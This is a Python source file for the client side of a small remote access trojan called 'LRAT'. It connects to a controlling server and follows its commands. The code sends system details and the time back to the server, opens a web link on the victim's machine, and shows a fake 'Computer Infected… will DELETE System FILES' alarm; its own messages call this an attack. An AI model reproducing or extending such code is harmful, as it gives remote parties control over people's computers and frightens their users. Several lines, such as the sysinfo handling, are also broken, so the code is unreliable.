import socket
import os
from threading import Thread
from colorama import Fore, Style
import colorama
import subprocess
import datetime
import webbrowser
from tkinter import messagebox
import platform

def __main__():
    os.system("clear")
    print(Fore.LIGHTCYAN_EX+" --] ----------------------------------------- [-- "+Style.RESET_ALL)
    print(Fore.LIGHTCYAN_EX+"|"+Style.RESET_ALL+" LRAT Client"+Fore.LIGHTCYAN_EX+" |")
    print(Fore.LIGHTCYAN_EX+" --] ----------------------------------------- [-- "+Style.RESET_ALL)

    print(Fore.LIGHTBLUE_EX+"Local IP -  A local or internal IP address is used inside a private network to locate the computers and devices connected to it.")
    print("To view your Local IP Address..")
    print(" - On Unix/Linux :: Open Terminal & type 'ifconfig'. You will see it there.")
    print(" - On Windows :: Open Command Prompt & type 'ipconfig'. You will see it there as IPv4 Address."+Style.RESET_ALL)
    host = input(Fore.LIGHTWHITE_EX+"[ ! ] Enter the LOCAL IP of the System Running LRAT Server : ")
    port = 415

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    input("[ i ] Host and Port Set. Press Enter to Try and Connect to LRAT Server.")


    def server_management():
        while(True):
            data = server.recv(1024)
            data = data.decode()

            if(data == "info"):
                server.send("At this time the Attack is Complete. You and me are Connected. So now you can send me Commands that I can follow.".encode())
            elif(data == "help"):
                server.send("Basic Commands : sysinfo, time, lol, cool, contribute, troll. I will follow these.".encode())
            elif(data == "sysinfo"):
                sysinfo = platform.version() + platform.uname() + platform.system() + platform.platform() 
                server.send(sysinfo).encode()
            elif(data == "time"):
                ostime = datetime.datetime.now()
                ostime = str(ostime)
                server.send(ostime.encode())
            elif(data == "lol"):
                server.send("LOOL I know! It's cool!".encode())
            elif(data == "cool"):
                server.send("I know! This is sooo COOL! Only if you know how to use it. So learn!".encode())
            elif(data == "contribute"):
                server.send("Yes. Contibute. I will now open a Link on the Client's PC.".encode())
                webbrowser.open_new("http://lrat.co.nf")
            elif(data == "troll"):
                server.send("OK, will do it.".encode())
                messagebox.showerror("SYSTEM ERROR", "Computer Infected by LRAT now will DELETE System FILES!")
            else:
                server.send("I don't understand this. Perhaps you can modify me.".encode())
            
    try:
        server.connect((host, port))
        server_management()
    except Exception as e:
        print(Fore.RED+"[ - ] Connection Failure : ", str(e)+Style.RESET_ALL)
        input("")
        __main__()


if __name__ == "__main__":
    __main__()